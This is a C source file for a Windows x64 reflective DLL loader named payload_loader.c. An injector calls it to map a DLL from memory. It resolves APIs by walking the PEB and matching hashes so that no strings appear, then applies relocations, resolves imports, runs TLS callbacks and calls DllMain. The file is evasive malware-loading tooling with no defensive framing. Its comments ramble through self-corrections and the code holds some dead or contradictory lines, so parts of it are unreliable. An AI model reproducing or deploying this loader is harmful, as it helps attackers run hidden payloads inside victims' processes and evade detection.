/* ============================================================================
 *  payload_loader.c — Position-independent manual DLL mapper.
 *
 *  Receives raw PE (DLL) bytes in memory, maps them into a freshly allocated
 *  block, resolves imports via PEB-walking + hash-matching (no strings),
 *  applies base relocations, calls TLS callbacks, and finally calls DllMain.
 *
 *  Calling convention (Windows x64 / MS ABI):
 *    RCX = pointer to raw DLL file bytes
 *    RDX = size of the DLL file
 *    Returns 0 on success, non-zero error code on failure.
 *
 *  The injector calls payload_entry() as a normal function pointer.
 * ============================================================================ */

#include <stdint.h>

/* --------------------------------------------------------------------------
 *  Type aliases for PE structures (minimal, position-safe)
 * -------------------------------------------------------------------------- */
typedef struct {
    uint16_t e_magic;     /* MZ */
    uint16_t e_cblp;
    uint16_t e_cp;
    uint16_t e_crlc;
    uint16_t e_cparhdr;
    uint16_t e_minalloc;
    uint16_t e_maxalloc;
    uint16_t e_ss;
    uint16_t e_sp;
    uint16_t e_csum;
    uint16_t e_ip;
    uint16_t e_cs;
    uint16_t e_lfarlc;
    uint16_t e_ovno;
    uint16_t e_res[4];
    uint16_t e_oemid;
    uint16_t e_oeminfo;
    uint16_t e_res2[10];
    uint32_t e_lfanew;    /* ← this is all we need */
} IMAGE_DOS_HEADER;

typedef struct {
    uint16_t  machine;
    uint16_t  number_of_sections;
    uint32_t  time_date_stamp;
    uint32_t  pointer_to_symbol_table;
    uint32_t  number_of_symbols;
    uint16_t  size_of_optional_header;
    uint16_t  characteristics;
} IMAGE_FILE_HEADER;

/* We only care about PE32+ (magic 0x20B) */
typedef struct {
    /* Standard fields */
    uint16_t  magic;                      /* 0x20B */
    uint8_t   major_linker_version;
    uint8_t   minor_linker_version;
    uint32_t  size_of_code;
    uint32_t  size_of_initialized_data;
    uint32_t  size_of_uninitialized_data;
    uint32_t  address_of_entry_point;     /* RVA of DllMain */
    uint32_t  base_of_code;
    uint64_t  image_base;                 /* preferred load address */
    /* Windows-specific fields */
    uint32_t  section_alignment;
    uint32_t  file_alignment;
    uint16_t  major_os_version;
    uint16_t  minor_os_version;
    uint16_t  major_image_version;
    uint16_t  minor_image_version;
    uint16_t  major_subsystem_version;
    uint16_t  minor_subsystem_version;
    uint32_t  win32_version_value;
    uint32_t  size_of_image;
    uint32_t  size_of_headers;
    uint32_t  check_sum;
    uint16_t  subsystem;
    uint16_t  dll_characteristics;
    uint64_t  size_of_stack_reserve;
    uint64_t  size_of_stack_commit;
    uint64_t  size_of_heap_reserve;
    uint64_t  size_of_heap_commit;
    uint32_t  loader_flags;
    uint32_t  number_of_rva_and_sizes;
    /* IMAGE_DATA_DIRECTORY data_directory[16] follows */
} IMAGE_OPTIONAL_HEADER64;

typedef struct {
    uint32_t virtual_address;
    uint32_t size;
} IMAGE_DATA_DIRECTORY;

typedef struct {
    uint8_t  name[8];
    uint32_t virtual_size;
    uint32_t virtual_address;
    uint32_t size_of_raw_data;
    uint32_t pointer_to_raw_data;
    uint32_t pointer_to_relocations;
    uint32_t pointer_to_linenumbers;
    uint16_t number_of_relocations;
    uint16_t number_of_linenumbers;
    uint32_t characteristics;
} IMAGE_SECTION_HEADER;

/* Import / export directory structures */
typedef struct {
    uint32_t import_lookup_table_rva;
    uint32_t time_date_stamp;
    uint32_t forwarder_chain;
    uint32_t name_rva;                    /* DLL name RVA */
    uint32_t import_address_table_rva;    /* IAT */
} IMAGE_IMPORT_DESCRIPTOR;

typedef struct {
    uint32_t characteristics;
    uint32_t time_date_stamp;
    uint16_t major_version;
    uint16_t minor_version;
    uint32_t name_rva;                    /* DLL name */
    uint32_t base;
    uint32_t number_of_functions;
    uint32_t number_of_names;
    uint32_t address_of_functions;        /* RVA */
    uint32_t address_of_names;            /* RVA */
    uint32_t address_of_name_ordinals;    /* RVA */
} IMAGE_EXPORT_DIRECTORY;

typedef struct {
    uint32_t start_rva;
    uint32_t size_of_block;
} IMAGE_BASE_RELOCATION;

/* IAT thunk (64-bit) */
typedef struct {
    uint64_t address_of_data;             /* IMAGE_ORDINAL_FLAG | ordinal, or RVA of IMAGE_IMPORT_BY_NAME */
} IMAGE_THUNK_DATA64;

/* TLS directory */
typedef struct {
    uint64_t  start_address_of_raw_data;
    uint64_t  end_address_of_raw_data;
    uint64_t  address_of_index;           /* PIMAGE_TLS_CALLBACK* */
    uint64_t  address_of_callbacks;       /* pointer to callback array (null-terminated) */
    uint32_t  size_of_zero_fill;
    uint32_t  characteristics;
} IMAGE_TLS_DIRECTORY;

/* --------------------------------------------------------------------------
 *  Pre-computed DJB2 hashes
 * -------------------------------------------------------------------------- */
#define HASH_KERNEL32_DLL      0x7040EE75UL
#define HASH_NTDLL_DLL         0x22D3B5EDUL
#define HASH_VIRTUAL_ALLOC     0x382C0F97UL
#define HASH_VIRTUAL_FREE      0x668FCF2EUL
#define HASH_VIRTUAL_PROTECT   0x844FF18DUL

/* --------------------------------------------------------------------------
 *  Forward declarations
 * -------------------------------------------------------------------------- */
static void*      get_peb(void)                    __attribute__((noinline));
static void*      find_module_by_hash(uint32_t hash)
                                                    __attribute__((noinline));
static void*      resolve_export_by_hash(void* dll_base, uint32_t fn_hash)
                                                    __attribute__((noinline));
static uint32_t   hash_ascii(const char* str)       __attribute__((noinline));
static uint32_t   hash_wide_modname(const uint16_t* buf, uint16_t len)
                                                    __attribute__((noinline));
static uint32_t   is_valid_pe(const uint8_t* base)  __attribute__((noinline));
static void*      get_nt_headers(const uint8_t* base)
                                                    __attribute__((noinline));

/* ============================================================================
 *  ENTRY POINT
 *  RCX = raw_dll_bytes, RDX = dll_size, returns 0=OK / error code
 * ============================================================================ */
__attribute__((section(".text.entry")))
uint64_t payload_entry(const uint8_t* raw_dll, uint64_t dll_size)
{
    if (!raw_dll || dll_size < 64) return 1;

    /* ── 1. Validate PE headers ─────────────────────────────────────────── */
    if (!is_valid_pe(raw_dll)) return 2;

    void* nt_headers = get_nt_headers(raw_dll);
    if (!nt_headers) return 3;

    uint16_t magic = *(uint16_t*)((uint8_t*)nt_headers + 0x18);
    if (magic != 0x20B) return 4;                 /* not PE32+ */

    IMAGE_OPTIONAL_HEADER64* opt =
        (IMAGE_OPTIONAL_HEADER64*)((uint8_t*)nt_headers + 0x18);

    uint64_t image_size   = opt->size_of_image;
    uint64_t image_base   = opt->image_base;
    uint32_t entry_rva    = opt->address_of_entry_point;
    uint32_t num_sections = *(uint16_t*)((uint8_t*)nt_headers + 0x06);
    uint32_t sect_offset  = (uint32_t)sizeof(uint32_t)
                          + sizeof(IMAGE_FILE_HEADER)
                          + opt->number_of_rva_and_sizes * sizeof(IMAGE_DATA_DIRECTORY)
                          + 0x18; /* skip optional header magic + fields up to data dir */

    /* ── 2. Resolve VirtualAlloc from kernel32 ──────────────────────────── */
    void* kernel32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!kernel32) return 5;

    typedef uint64_t (__attribute__((ms_abi)) *fn_virt_alloc_t)(
        void*, uint64_t, uint32_t, uint32_t);
    fn_virt_alloc_t fn_virt_alloc =
        (fn_virt_alloc_t)resolve_export_by_hash(kernel32, HASH_VIRTUAL_ALLOC);
    if (!fn_virt_alloc) return 6;

    /* ── 3. Allocate memory for the DLL image ───────────────────────────── */
    void* local_base = (void*)fn_virt_alloc(
        0,                      /* lpAddress = NULL (let system choose) */
        image_size,             /* dwSize    = SizeOfImage              */
        0x3000,                 /* MEM_RESERVE | MEM_COMMIT = 0x3000     */
        0x04                    /* PAGE_READWRITE = 0x04                 */
    );
    if (!local_base) return 7;

    /* ── 4. Copy headers ────────────────────────────────────────────────── */
    uint32_t size_of_headers = opt->size_of_headers;
    for (uint32_t i = 0; i < size_of_headers; i++) {
        ((uint8_t*)local_base)[i] = raw_dll[i];
    }

    /* ── 5. Copy sections ───────────────────────────────────────────────── */
    IMAGE_SECTION_HEADER* sec =
        (IMAGE_SECTION_HEADER*)((uint8_t*)nt_headers + sect_offset);

    for (uint32_t i = 0; i < num_sections; i++, sec++) {
        if (sec->size_of_raw_data == 0 || sec->pointer_to_raw_data == 0) {
            /* .bss or uninitialized — zero it */
            if (sec->virtual_size > 0) {
                uint8_t* dst = (uint8_t*)local_base + sec->virtual_address;
                for (uint32_t j = 0; j < sec->virtual_size; j++) {
                    dst[j] = 0;
                }
            }
            continue;
        }
        uint8_t* src = (uint8_t*)raw_dll + sec->pointer_to_raw_data;
        uint8_t* dst = (uint8_t*)local_base + sec->virtual_address;
        uint32_t copy_size = sec->size_of_raw_data;
        if (copy_size > sec->virtual_size) copy_size = sec->virtual_size;
        for (uint32_t j = 0; j < copy_size; j++) {
            dst[j] = src[j];
        }
    }

    /* ── 6. Apply base relocations (if delta != 0) ──────────────────────── */
    int64_t delta = (uint64_t)local_base - image_base;
    if (delta != 0) {
        /* Find .reloc section — scan for "IMAGE_DATA_DIRECTORY[5]" (Base Relocation Table) */
        uint32_t reloc_rva = 0;
        uint32_t reloc_size = 0;
        /* Data directory 6 (index 5) = Base Relocation Table */
        uint32_t dd_offset = (uint32_t)(sizeof(uint32_t) + sizeof(IMAGE_FILE_HEADER)
                              + 0x18 + sizeof(IMAGE_OPTIONAL_HEADER64)
                              - sizeof(IMAGE_DATA_DIRECTORY) * 16);
        /* Actually, let me just do this precisely: */
        {
            uint8_t* nt = (uint8_t*)nt_headers;
            uint16_t opt_hdr_size = *(uint16_t*)(nt + 0x10 + 0x04); /* FileHeader.SizeOfOptionalHeader */
            /* DataDirectory starts at the end of optional header.
             * For PE32+, the data directory index 5 is at offset 0x78 + 5*8 = 0xA0 from NT headers
             * if NumberOfRvaAndSizes >= 6.  But the safe way: */
            uint32_t dd_base = 0x18 + opt_hdr_size - 16 * sizeof(IMAGE_DATA_DIRECTORY);
            /* Actually that's wrong. Let me re-derive.
             * NT headers: Signature(4) + FileHeader(20) + OptionalHeader.
             * OptionalHeader ends with 16 IMAGE_DATA_DIRECTORY entries.
             * Total optional header size = SizeOfOptionalHeader.
             * DataDirectory[0] starts at Signature + 4 + 20 + SizeOfOptionalHeader - 16*8.
             * Wait no. The DataDirectory is INSIDE the optional header, at the end.
             * SizeOfOptionalHeader includes the data directory.
             * The offset from NT headers to DataDirectory[0] is:
             *   0x18 (offset of OptionalHeader from NT headers)
             *   + offset of NumberOfRvaAndSizes within OptionalHeader (= 0x70 for PE32+)
             *   + 4 (NumberOfRvaAndSizes itself)
             *   = 0x18 + 0x70 + 4 = 0x8C from NT headers for PE32+
             *
             * But actually I already know from the export lookup that DataDirectory[0]
             * is at nt+0x78 for PE32+. Let me just use fixed offsets.
             *
             * For PE32+:
             *   NT+0x78 = DataDirectory[0] (Export)
             *   NT+0x80 = DataDirectory[1] (Import)
             *   ...
             *   NT+0x78 + 5*8 = NT+0xA0 = DataDirectory[5] (Base Relocation)
             */
            reloc_rva  = *(uint32_t*)(nt + 0xA0);
            reloc_size = *(uint32_t*)(nt + 0xA4);
        }

        if (reloc_rva != 0 && reloc_size != 0) {
            uint8_t* reloc_base = (uint8_t*)local_base + reloc_rva;
            uint8_t* reloc_end  = reloc_base + reloc_size;

            uint8_t* pos = reloc_base;
            while (pos < reloc_end) {
                IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)pos;
                if (block->size_of_block < sizeof(IMAGE_BASE_RELOCATION)) break;
                uint32_t entries_count = (block->size_of_block - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                uint16_t* entries = (uint16_t*)(pos + sizeof(IMAGE_BASE_RELOCATION));
                for (uint32_t j = 0; j < entries_count; j++) {
                    uint16_t entry = entries[j];
                    uint16_t type  = entry >> 12;
                    uint16_t offset= entry & 0x0FFF;
                    if (type == 0) continue;           /* IMAGE_REL_BASED_ABSOLUTE */
                    if (type == 0x0A) {                 /* IMAGE_REL_BASED_DIR64 */
                        uint64_t* patch_addr = (uint64_t*)((uint8_t*)local_base + block->start_rva + offset);
                        *patch_addr = (uint64_t)((int64_t)(*patch_addr) + delta);
                    }
                }
                pos += block->size_of_block;
            }
        }
    }

    /* ── 7. Resolve imports ─────────────────────────────────────────────── */
    {
        uint8_t* nt = (uint8_t*)nt_headers;

        /* Use DataDirectory[1] (Import) at NT+0x88 on PE32+ (wait, I need to recompute)
         * DataDirectory[0] = NT+0x78 => DD[1] = NT+0x80, DD[2] = NT+0x88, ...
         * Actually:
         *   NT+0x78 = DD[0] Export
         *   NT+0x80 = DD[1] Import
         *   NT+0x88 = DD[2] Resource
         * Wait no. Each IMAGE_DATA_DIRECTORY is 8 bytes (RVA + Size = 4+4 = 8).
         * So DD[index] starts at NT + 0x78 + index*8.
         * DD[0] = NT+0x78 (Export)
         * DD[1] = NT+0x80 (Import)
         */
        uint32_t import_rva  = *(uint32_t*)(nt + 0x80);
        uint32_t import_size = *(uint32_t*)(nt + 0x84);

        if (import_rva != 0 && import_size != 0) {
            uint8_t* import_dir = (uint8_t*)local_base + import_rva;
            IMAGE_IMPORT_DESCRIPTOR* desc = (IMAGE_IMPORT_DESCRIPTOR*)import_dir;

            while (desc->name_rva != 0) {
                /* Resolve imported DLL name via hash */
                const char* dll_name = (const char*)((uint8_t*)local_base + desc->name_rva);
                uint32_t dll_hash = hash_ascii(dll_name);
                void* import_dll_base = find_module_by_hash(dll_hash);
                if (!import_dll_base) {
                    /* Maybe we already have it? Try next descriptor. */
                    desc++;
                    continue;
                }

                /* Walk the IAT / ILT */
                if (desc->import_lookup_table_rva == 0) {
                    desc++;
                    continue;
                }
                uint64_t* ilt = (uint64_t*)((uint8_t*)local_base + desc->import_lookup_table_rva);
                uint64_t* iat = (uint64_t*)((uint8_t*)local_base + desc->import_address_table_rva);

                for (int idx = 0; ; idx++) {
                    uint64_t entry = ilt[idx];
                    if (entry == 0) break;

                    /* If the high bit is set (IMAGE_ORDINAL_FLAG64 = 0x8000000000000000),
                     * this is an ordinal import — skip for simplicity. */
                    if (entry & 0x8000000000000000ULL) continue;

                    /* entry is the RVA of an IMAGE_IMPORT_BY_NAME structure.
                     * At that RVA: +0x00 Hint (u16), +0x02 Name (null-terminated). */
                    uint32_t name_rva = (uint32_t)(entry & 0x7FFFFFFF);
                    const char* fn_name = (const char*)((uint8_t*)local_base + name_rva + 2);
                    uint32_t fn_hash = hash_ascii(fn_name);

                    void* fn_addr = resolve_export_by_hash(import_dll_base, fn_hash);
                    if (fn_addr) {
                        iat[idx] = (uint64_t)fn_addr;
                    }
                }

                desc++;
            }
        }
    }

    /* ── 8. Set memory protections ──────────────────────────────────────── */
    /* For each section, apply the correct protection via VirtualProtect.
     * Resolve VirtualProtect from kernel32. */
    void* fn_virt_protect = resolve_export_by_hash(kernel32, HASH_VIRTUAL_PROTECT);
    /* VirtualProtect is optional — if we can't get it, skip protection changes */

    sec = (IMAGE_SECTION_HEADER*)((uint8_t*)nt_headers + sect_offset);
    for (uint32_t i = 0; i < num_sections; i++, sec++) {
        if (sec->virtual_address == 0) continue;
        uint8_t* sec_base = (uint8_t*)local_base + sec->virtual_address;
        uint32_t sec_size = sec->virtual_size > 0 ? sec->virtual_size : sec->size_of_raw_data;
        if (sec_size == 0) continue;

        uint32_t pe_char = sec->characteristics;
        uint32_t protect = 0x04; /* PAGE_READWRITE default */

        if ((pe_char & 0x20000000) && !(pe_char & 0x80000000) && !(pe_char & 0x40000000)) {
            protect = 0x20; /* PAGE_EXECUTE_READ */
        } else if ((pe_char & 0x20000000) && (pe_char & 0x80000000) && !(pe_char & 0x40000000)) {
            protect = 0x80; /* PAGE_EXECUTE_WRITECOPY -> use PAGE_EXECUTE_READWRITE */
            protect = 0x40;
        } else if ((pe_char & 0x20000000) && !(pe_char & 0x80000000)) {
            protect = 0x10; /* PAGE_EXECUTE */
        } else if (!(pe_char & 0x20000000) && (pe_char & 0x80000000) && !(pe_char & 0x40000000)) {
            protect = 0x04; /* PAGE_READWRITE */
        } else if (!(pe_char & 0x20000000) && (pe_char & 0x80000000)) {
            protect = 0x02; /* PAGE_READONLY -> hmm, actually PAGE_WRITECOPY=0x08, but use PAGE_READONLY=0x02 */
            protect = 0x02;
        } else if (!(pe_char & 0x20000000) && (pe_char & 0x40000000)) {
            protect = 0x01; /* PAGE_NOACCESS */
        } else {
            protect = 0x04;
        }

        if (fn_virt_protect && sec_size > 0) {
            uint32_t old_protect = 0;
            typedef uint64_t (__attribute__((ms_abi)) *fn_vp_t)(void*, uint64_t, uint32_t, uint32_t*);
            ((fn_vp_t)fn_virt_protect)(sec_base, sec_size, protect, &old_protect);
        }
    }

    /* ── 9. Call TLS callbacks ──────────────────────────────────────────── */
    {
        uint8_t* nt_hdr = (uint8_t*)get_nt_headers(raw_dll);
        uint32_t tls_rva  = *(uint32_t*)(nt_hdr + 0x98); /* DD[4] TLS at NT+0x78+4*8 = NT+0x98 */
        uint32_t tls_size = *(uint32_t*)(nt_hdr + 0x9C);
        if (tls_rva != 0 && tls_size != 0) {
            IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((uint8_t*)local_base + tls_rva);
            if (tls->address_of_callbacks != 0) {
                uint64_t* callback_ptr = (uint64_t*)tls->address_of_callbacks;
                while (*callback_ptr != 0) {
                    typedef void (__attribute__((ms_abi)) *tls_cb_t)(void*, uint32_t, void*);
                    tls_cb_t cb = (tls_cb_t)(*callback_ptr);
                    cb(local_base, 0, 0);  /* DLL_PROCESS_ATTACH */
                    callback_ptr++;
                }
            }
        }
    }

    /* ── 10. Call DllMain ────────────────────────────────────────────────── */
    if (entry_rva != 0) {
        typedef int (__attribute__((ms_abi)) *dll_main_t)(void*, uint32_t, void*);
        dll_main_t dll_entry = (dll_main_t)((uint8_t*)local_base + entry_rva);
        int result = dll_entry(local_base, 1, 0);  /* DLL_PROCESS_ATTACH = 1 */
        if (result == 0) {
            /* DllMain returned FALSE — but we still mapped the DLL; caller decides what to do */
            return 0; /* We still succeeded in loading, DllMain failure is informational */
        }
    }

    return 0; /* success */
}

/* ============================================================================
 *  PEB access
 * ============================================================================ */
static void* get_peb(void)
{
    void* peb;
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r" (peb));
    return peb;
}

/* ============================================================================
 *  Hash functions (DJB2)
 * ============================================================================ */
static uint32_t hash_ascii(const char* str)
{
    uint32_t h = 5381;
    while (*str) {
        uint8_t c = (uint8_t)(*str++);
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static uint32_t hash_wide_modname(const uint16_t* buf, uint16_t len_bytes)
{
    uint32_t h = 5381;
    uint16_t i;
    for (i = 0; i < len_bytes / 2; i++) {
        uint16_t wc = buf[i];
        uint8_t  c  = (uint8_t)(wc & 0xFF);
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + c;
    }
    return h;
}

/* ============================================================================
 *  PE validation helpers
 * ============================================================================ */
static uint32_t is_valid_pe(const uint8_t* base)
{
    if (*(uint16_t*)base != 0x5A4D) return 0;       /* "MZ" */
    uint32_t e_lfanew = *(uint32_t*)(base + 0x3C);
    if (e_lfanew < 64 || e_lfanew > 0x1000) return 0;
    if (*(uint32_t*)(base + e_lfanew) != 0x00004550) return 0; /* "PE\0\0" */
    return 1;
}

static void* get_nt_headers(const uint8_t* base)
{
    if (*(uint16_t*)base != 0x5A4D) return 0;
    uint32_t e_lfanew = *(uint32_t*)(base + 0x3C);
    return (void*)(base + e_lfanew);
}

/* ============================================================================
 *  Find a module in the PEB LDR by hashed name
 * ============================================================================ */
static void* find_module_by_hash(uint32_t target_hash)
{
    void* peb = get_peb();
    if (!peb) return 0;

    void* ldr = *(void**)((uint8_t*)peb + 0x18);
    if (!ldr) return 0;

    void* pFlink = *(void**)((uint8_t*)ldr + 0x20);
    if (!pFlink) return 0;

    void* entry = pFlink;
    for (int i = 0; i < 256; i++) {
        uint8_t* base = (uint8_t*)entry;

        void* dll_base = *(void**)(base + 0x30);
        if (!dll_base) goto next_mod;

        uint16_t name_len = *(uint16_t*)(base + 0x58);
        void*    name_buf = *(void**)(base + 0x60);
        if (!name_buf || name_len == 0) goto next_mod;

        uint32_t mod_hash = hash_wide_modname((const uint16_t*)name_buf, name_len);
        if (mod_hash == target_hash) {
            return dll_base;
        }

next_mod:
        void* next_flink = *(void**)entry;
        if (!next_flink || next_flink == pFlink) break;
        entry = next_flink;
    }
    return 0;
}

/* ============================================================================
 *  Resolve an exported function from a PE module by name hash
 * ============================================================================ */
static void* resolve_export_by_hash(void* dll_base, uint32_t fn_hash)
{
    if (!dll_base) return 0;
    uint8_t* base = (uint8_t*)dll_base;

    if (*(uint16_t*)base != 0x5A4D) return 0;
    uint32_t e_lfanew = *(uint32_t*)(base + 0x3C);
    uint8_t* nt = base + e_lfanew;
    if (*(uint32_t*)nt != 0x00004550) return 0;
    uint16_t magic = *(uint16_t*)(nt + 0x18);
    if (magic != 0x20B) return 0;

    uint32_t export_rva  = *(uint32_t*)(nt + 0x78);
    uint32_t export_size = *(uint32_t*)(nt + 0x7C);
    if (export_rva == 0 || export_size == 0) return 0;

    uint8_t* exp = base + export_rva;

    uint32_t num_names   = *(uint32_t*)(exp + 0x18);
    uint32_t addr_funcs  = *(uint32_t*)(exp + 0x1C);
    uint32_t addr_names  = *(uint32_t*)(exp + 0x20);
    uint32_t addr_ord    = *(uint32_t*)(exp + 0x24);

    uint32_t* funcs_va = (uint32_t*)(base + addr_funcs);
    uint32_t* names_va = (uint32_t*)(base + addr_names);
    uint16_t* ordinals = (uint16_t*)(base + addr_ord);

    for (uint32_t i = 0; i < num_names; i++) {
        const char* fn_name = (const char*)(base + names_va[i]);
        uint32_t h = hash_ascii(fn_name);
        if (h == fn_hash) {
            uint16_t ord = ordinals[i];
            uint32_t fn_rva = funcs_va[ord];
            if (fn_rva >= export_rva && fn_rva < export_rva + export_size) {
                return 0;
            }
            return (void*)(base + fn_rva);
        }
    }
    return 0;
}
